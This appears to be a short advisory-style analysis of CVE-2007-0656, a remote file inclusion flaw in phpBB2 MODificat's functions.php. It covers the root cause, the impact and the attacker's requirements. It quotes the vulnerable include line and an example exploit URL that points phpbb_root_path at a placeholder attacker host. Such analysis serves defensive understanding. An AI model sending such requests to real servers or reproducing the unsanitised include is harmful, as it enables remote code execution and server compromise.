Based on the provided content, here's an analysis of CVE-2007-0656:

**Root cause of vulnerability:**

The vulnerability stems from a remote file inclusion (RFI) flaw in the `functions.php` file of the phpBB2 MODificat application. Specifically, the `$phpbb_root_path` variable is not properly sanitized, allowing an attacker to inject a malicious URL.

**Weaknesses/vulnerabilities present:**

*   **Remote File Inclusion (RFI):** The core issue is that the application includes a file based on user-supplied input (`$phpbb_root_path`) without adequate validation. This allows an attacker to include a file from a remote server.

**Impact of exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary PHP code on the vulnerable server. This could lead to complete server compromise, data theft, defacement, or other malicious activities.

**Attack vectors:**

*   **HTTP GET request:** The vulnerability can be exploited by sending a specially crafted HTTP GET request to the `functions.php` file.
*   **Manipulated parameter:** The attacker manipulates the `phpbb_root_path` parameter in the URL to point to a remote server hosting a malicious PHP script.

**Required attacker capabilities/position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Knowledge of vulnerable application:** The attacker needs to know the path to `functions.php` within the phpBB2 MODificat installation and the vulnerable parameter name.
*   **Hosting of malicious script:** The attacker needs a server to host the malicious PHP script that will be included on the target server.

**Technical Details:**
The vulnerable code snippet is:
```php
include_once( $phpbb_root_path . './includes/functions_categories_hierarchy.' . $phpEx );
```
The exploit involves setting the `phpbb_root_path` parameter in the URL to a remote URL to include the attacker's malicious script, for example:
```
www.[target].com/[script_path]/includes/functions.php?phpbb_root_path=http://evilscripts?
```
This will cause the server to include the content of `http://evilscripts?` as a PHP script.
